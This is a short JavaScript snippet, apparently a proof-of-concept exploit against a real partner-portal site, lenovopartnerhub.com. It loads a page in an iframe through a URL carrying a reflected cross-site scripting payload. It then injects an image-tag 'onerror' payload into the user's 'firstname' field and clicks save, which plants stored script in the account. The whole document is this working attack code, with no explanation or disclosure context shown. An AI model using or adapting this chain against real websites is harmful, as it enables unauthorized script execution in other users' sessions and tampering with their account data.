var frame = document.createElement("iframe");
frame.addEventListener("load", function() {
  setTimeout(function() {
    frame.contentDocument.getElementById("firstname").value = '<img src="q" onerror="alert(5555)">';
    frame.contentDocument.getElementsByClassName("save")[0].click();
    setTimeout(function() {
      console.log("CHANGED!");
    }, 2000);
  }, 1000);
});
frame.src = "https://www.lenovopartnerhub.com/en-GB/group/morocco-site/rebate-programs?p_p_id=emeaRebateList_INSTANCE_jX1lOh6i9eO1&_emeaRebateList_INSTANCE_jX1lOh6i9eO1_gridView=&_emeaRebateList_INSTANCE_jX1lOh6i9eO1_listView=%22%2F%3e%3cimg%20src%3dq%20onerror%3Dalert%28%31%29%3e";
document.body.appendChild(frame);

